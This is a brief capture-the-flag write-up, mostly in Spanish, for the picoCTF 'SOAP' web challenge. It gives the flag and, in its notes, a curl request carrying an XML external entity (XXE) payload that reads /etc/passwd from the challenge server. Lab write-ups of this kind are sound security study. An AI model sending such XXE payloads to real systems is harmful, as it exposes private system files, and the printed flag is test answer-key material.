# Reto
SOAP
## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:58719/)
## Solución
picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
## Notas
Se colocó en la terminal lo siguiente:
curl -X POST [http://saturn.picoctf.net:58533](http://saturn.picoctf.net:58533/)/data \

     -H "Content-Type: application/xml" \

     -d '<?xml version="1.0" encoding="UTF-8"?>

         <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

         <data>

            <ID>&xxe;</ID>

         </data>'
## Referencias